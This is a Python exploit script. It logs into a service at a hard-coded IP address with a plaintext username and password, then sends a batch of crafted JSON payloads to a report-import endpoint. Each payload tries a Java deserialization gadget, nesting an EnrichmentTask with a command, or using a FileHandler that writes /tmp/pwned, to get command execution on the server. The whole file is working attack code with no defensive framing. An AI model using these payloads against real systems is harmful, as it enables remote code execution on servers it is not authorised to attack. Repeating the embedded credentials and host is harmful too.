import requests
import json
import sys

base = "http://52.76.96.108:8087"
r = requests.post(base + "/login", json={"username": "analyst", "password": "cerberus123"})
print("login", r.status_code, r.text)
tok = r.json()["token"]
h = {"Authorization": "Bearer " + tok, "Content-Type": "application/json"}


def send(name, p):
    p.setdefault("bundleName", "t")
    p.setdefault("source", "t")
    if "reports" not in p:
        p["reports"] = []
    r = requests.post(base + "/report/import", headers=h, data=json.dumps(p))
    print(f"=== {name} ===")
    print(r.status_code, r.text[:500])
    print()


# Nested type attempts
send(
    "hashmap-nested",
    {
        "enrichment": [
            "java.util.HashMap",
            {"a": ["com.ucsi.cerberus.enrich.EnrichmentTask", {"command": ["id"]}]},
        ]
    },
)

send(
    "arraylist-atclass",
    {
        "enrichment": [
            "java.util.ArrayList",
            [
                {
                    "@class": "com.ucsi.cerberus.enrich.EnrichmentTask",
                    "command": ["id"],
                }
            ],
        ]
    },
)

send(
    "arraylist-wrapper",
    {
        "enrichment": [
            "java.util.ArrayList",
            [["com.ucsi.cerberus.enrich.EnrichmentTask", {"command": ["id"]}]],
        ]
    },
)

send(
    "singletonlist",
    {
        "enrichment": [
            "java.util.Collections$SingletonList",
            ["com.ucsi.cerberus.enrich.EnrichmentTask", {"command": ["id"]}],
        ]
    },
)

send(
    "aslist",
    {
        "enrichment": [
            "java.util.Arrays$ArrayList",
            [["com.ucsi.cerberus.enrich.EnrichmentTask", {"command": ["id"]}]],
        ]
    },
)

send(
    "prop-style",
    {
        "enrichment": {
            "@class": "com.ucsi.cerberus.enrich.EnrichmentTask",
            "command": ["id"],
        }
    },
)

send(
    "report-as-enrich-task",
    {"reports": [["com.ucsi.cerberus.enrich.EnrichmentTask", {"command": ["id"]}]]},
)

# Try subtype of allowed report that somehow embeds task - extra props
send(
    "incident-extra",
    {
        "reports": [
            [
                "com.ucsi.cerberus.model.IncidentReport",
                {
                    "id": "x",
                    "title": "t",
                    "severity": "low",
                    "summary": "s",
                    "command": ["id"],
                    "enrichment": [
                        "com.ucsi.cerberus.enrich.EnrichmentTask",
                        {"command": ["id"]},
                    ],
                },
            ]
        ]
    },
)

# FileHandler gadget
send(
    "filehandler",
    {
        "enrichment": [
            "java.util.logging.FileHandler",
            {"pattern": "/tmp/pwned", "append": True},
        ]
    },
)

# Try with type info as first element of list without outer wrapper re-check
send(
    "raw-list-no-type",
    {"enrichment": [["com.ucsi.cerberus.enrich.EnrichmentTask", {"command": ["id"]}]]},
)

# minimal class id
send(
    "minimal",
    {
        "enrichment": [
            "com.ucsi.cerberus.enrich.EnrichmentTask",
            {"command": ["id"]},
        ]
    },
)

# try java.util.concurrent classes
send(
    "copyonwrite",
    {
        "enrichment": [
            "java.util.concurrent.CopyOnWriteArrayList",
            [["com.ucsi.cerberus.enrich.EnrichmentTask", {"command": ["id"]}]],
        ]
    },
)
